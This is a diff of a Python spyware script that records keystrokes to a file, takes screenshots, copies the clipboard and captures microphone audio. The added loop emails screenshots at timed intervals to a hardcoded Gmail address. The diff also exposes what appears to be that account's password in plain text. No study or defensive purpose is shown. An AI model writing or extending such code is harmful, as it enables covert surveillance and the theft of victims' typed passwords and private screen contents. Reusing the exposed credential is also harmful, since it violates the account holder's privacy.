@@ -39,7 +39,10 @@ clipboard_info = "clipboard.txt"
 audio_info = "audio.wav"
 screenshot_info = "screenshot.png"
 
-mic_time = 15
+mic_time = 10
+
+time_iteration = 15
+number_of_iterations_end = 3 
 
 email_addr = "divkirnapure7@gmail.com"
 password = "uqrlxmkvoncsccru"
@@ -51,44 +54,6 @@ toaddr = "divkirnapure7@gmail.com"
 file_path = "C:\\me\\python"
 extend = "\\"
 
-count = 0
-keys = []
-
-def on_press(key):
-    global keys, count 
-
-    keys.append(key)
-    count += 1
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-
-
-def write_file(keys):
-    with open(file_path + extend + key_info, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write("\n")
-                f.close()
-
-            elif k.find("key") == -1:
-                f.write(k)
-                f.close()
-
-def on_release(key):
-    try:
-        if key == Key.esc:
-            print("Exiting...")
-            return False
-    
-    except AttributeError:
-        pass
-    
-with Listener(on_press= on_press, on_release= on_release) as listner:
-    listner.join()
 
 # adding email functionality
 
@@ -202,3 +167,74 @@ def screenshot():
     print("Screen Captured.")
 
 screenshot()
+
+
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+
+while number_of_iterations < number_of_iterations_end:
+
+    count = 0
+    keys = []
+
+    def on_press(key):
+        global keys, count, currentTime
+
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
+
+
+    def write_file(keys):
+        with open(file_path + extend + key_info, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write("\n")
+                    f.close()
+
+                elif k.find("key") == -1:
+                    f.write(k)
+                    f.close()
+
+    def on_release(key):
+        try:
+            if key == Key.esc:
+                print("Exiting...")
+                return False
+            
+            if currentTime > stoppingTime:
+                return False
+        
+        except AttributeError:
+            pass
+        
+    with Listener(on_press= on_press, on_release= on_release) as listner:
+        listner.join()
+
+    if currentTime > stoppingTime:
+
+        with open(file_path + extend + key_info, "w") as f:
+            f.write(" ")
+
+        
+        screenshot()
+        send_email(
+            filename=screenshot_info,
+            attachment_path=file_path + extend + screenshot_info,
+            toaddr=toaddr
+        )
+
+        copy_clipboard()
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
